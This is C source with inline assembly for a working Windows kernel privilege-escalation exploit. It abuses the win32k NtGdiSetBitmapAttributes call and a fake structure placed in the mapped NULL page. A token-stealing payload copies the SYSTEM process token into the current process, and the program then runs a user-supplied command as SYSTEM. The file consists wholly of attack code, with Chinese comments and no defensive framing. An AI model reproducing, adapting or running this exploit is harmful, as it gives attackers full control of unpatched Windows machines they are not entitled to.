#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#ifndef W32KAPI
#define W32KAPI DECLSPEC_ADDRSAFE
#endif

#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define PROCESS_LINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

#define eSyscall_NtGdiSetBitmapAttributes 0x1110

typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(IN HANDLE     ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG      ZeroBits,
	IN OUT PULONG AllocationSize,
	IN ULONG      AllocationType,
	IN ULONG      Protect);

NtAllocateVirtualMemory_t NtAllocateVirtualMemory = 0;
PVOID kifastsystemcall = NULL;

BOOLEAN Init() {
	HMODULE hNt = LoadLibraryA("ntdll.dll");
	if (!hNt) {
		printf("[+]Error:%d\n", __LINE__ - 2);
		return FALSE;
	}
	kifastsystemcall = (PVOID)GetProcAddress(hNt, "KiFastSystemCall");
	if (!kifastsystemcall) {
		printf("[+]Error:%d\n", __LINE__ - 2);
		return FALSE;
	}

	NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNt, "NtAllocateVirtualMemory");
	if (!NtAllocateVirtualMemory)
	{
		printf("[+]Error:%d\n", __LINE__ - 2);
		return FALSE;
	}

	return TRUE;
}

__declspec(noinline)VOID AttackPayload() 
{
	__asm 
	{
		pushad; 保存堆栈状态
		xor eax, eax
		mov eax, fs: [eax + KTHREAD_OFFSET] ; 获取当前进程对象 _EPROCESS
		mov eax, [eax + EPROCESS_OFFSET]
		mov ebx, eax; ebx保存的是当前进程的_EPROCESS
		mov ecx, SYSTEM_PID

		SearchSystemPID :
		mov eax, [eax + PROCESS_LINK_OFFSET]
			sub eax, PROCESS_LINK_OFFSET
			cmp[eax + PID_OFFSET], ecx; 判断是否是system的PID
			jne SearchSystemPID

			; 如果是则开始将当前进程的TOKEN替换程system的TOKEN
			mov edx, [eax + TOKEN_OFFSET]; 取得system的TOKEN
			mov[ebx + TOKEN_OFFSET], edx; 替换当前进程的TOKEN
			popad; 恢复堆栈状态
			mov[esp + 0xc], 0; edi = 0
			mov eax, 1
	}
}

unsigned int demo_CreateBitmapIndirect() 
{
	static BITMAP bitmap = { 0, 8, 8, 2, 1, 1 };
	static BYTE bits[8][2] = { 0xFF, 0, 0x0C, 0, 0x0C, 0, 0x0C, 0,0xFF, 0, 0xC0, 0, 0xC0, 0, 0xC0, 0 };

	bitmap.bmBits = bits;
	//SetLastError(NO_ERROR);

	HBITMAP hBitmap = CreateBitmapIndirect(&bitmap);

	return (unsigned int)hBitmap;
}

W32KAPI HBITMAP NTAPI NtGdiSetBitmapAttributes(HBITMAP argv0, DWORD argv1) 
{
	__asm
	{
		push argv1;
		push argv0;
		push 0x00;
		mov eax, eSyscall_NtGdiSetBitmapAttributes;
		mov edx, kifastsystemcall;
		call edx;
		add esp, 0x0c;
	}
}

BOOLEAN Fake_Hdev() {

	//分配0页内存
	PVOID baseAddress = (PVOID)1;
	ULONG regionsize = 0x1000;

	if (NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
		&baseAddress,
		0,
		&regionsize,
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE)) {
		printf("[+]Error:%d\n", __LINE__ - 6);
		return FALSE;
	}
	//构造
	*(PDWORD)0x748 = (DWORD)&AttackPayload;
	*(PWORD)0x590 = (WORD)1;
	*(PWORD)0x592 = (WORD)1;
	*(PWORD)0x3C = (WORD)7;

	return TRUE;
}


DWORD WINAPI Exploit_Thread(LPVOID lParam) {
	HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();
	HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)0x8f9);

	RECT rect = { 0 };
	rect.left = 0x368c;
	rect.top = 0x400000;
	HRGN hRgn = (HRGN)CreateRectRgnIndirect(&rect);

	HDC hdc = (HDC)CreateCompatibleDC((HDC)0x0);
	SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);

	HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)0x00edfc13);

	FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);

	return 0;
}


int main(int argc, char** argv) {
	if (!Init()) {
		printf("[+]Error:%d\n", __LINE__ - 1);
		return -1;
	}

	if (!Fake_Hdev()) {
		printf("[+]Error:%d\n", __LINE__ - 1);
		return -1;
	}

	HANDLE hThread = CreateThread(0, 0, Exploit_Thread, 0, 0, 0);
	if (!hThread) {
		printf("[+]Error:%d\n", __LINE__ - 2);
		return -1;
	}
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	printf("\n[*]Try execute %s as SYSTEM!\n", argv[1]);

	system(argv[1]);

	system("pause");
	return 0;
}
